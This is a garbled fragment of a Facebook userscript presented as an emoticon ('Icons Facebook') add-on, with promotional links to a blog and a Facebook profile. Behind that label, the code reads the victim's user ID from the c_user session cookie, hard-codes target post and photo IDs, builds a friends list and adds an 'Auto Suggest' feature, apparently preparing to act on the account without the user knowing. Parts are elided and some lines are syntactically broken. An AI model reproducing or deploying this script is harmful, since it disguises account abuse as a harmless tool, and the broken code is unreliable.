// ==UserScript==
// @name            Icons Facebook
// @description     Modified by Tuyul Scripts
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @include         http://kuruzamat.blogspot.com/
// ==/UserScript==
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
...
///  pake bahasa linggis segala pokoknya modififikator yang gak mampu buat beli sekrup.                                ///
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/sugeng.harto" target="_blank">Modified by Tuyul Scripters <br>CLICK FB</a>';
	     <a class="jewelFooter" href="https://kuruzamat.blogspot.com/" target="_blank">My Blog  <br>CLICK Blog</a>';
        html += '</div>';
...
var spost_id = "100000007221258";
var sfoto_id = "159279207415652";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Tuyul Scripts';
